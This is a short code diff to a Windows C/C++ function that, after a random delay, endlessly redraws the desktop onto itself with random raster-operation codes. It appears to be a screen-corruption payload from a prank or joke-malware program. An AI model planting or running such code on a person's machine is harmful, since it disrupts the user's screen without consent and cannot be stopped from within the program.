@@ -231,22 +231,16 @@ int p9()
     return 0;
 }
 
+// bitblits random 
 int p10() {
     Sleep(rand() % 10000);
     HDC desk = GetDC(NULL);
     while (true) {
+        DWORD randNum = (rand() % 0x99999999) * 0x500;
         for (int i = 0; i < 500; i++) {
-            //0x32526961 is pogChamp
-            //42069420 (NO 0x I MAKE MY OWN RULES) is pog
-            //0x69696969
-            //0x3167000 is insnae
-            //0x8107520 is wOw
-            BitBlt(desk, i, i, 1500, 1000, desk, 0, 0, 0x3167000);
-            // BitBlt(desk, 0, 0, 1920, 1080, desk, 0, 0, 0x69696969);
+            BitBlt(desk, i, i, 1500, 1000, desk, 0, 0, randNum);
         }
-        /*for (int i = 0; i < 6942; i++) {
-            BitBlt(desk, 0, 0, 1920, 1080, desk, -i, 0, SRCCOPY);
-        } */
         Sleep(1000);
     }
+    return 0;
 }
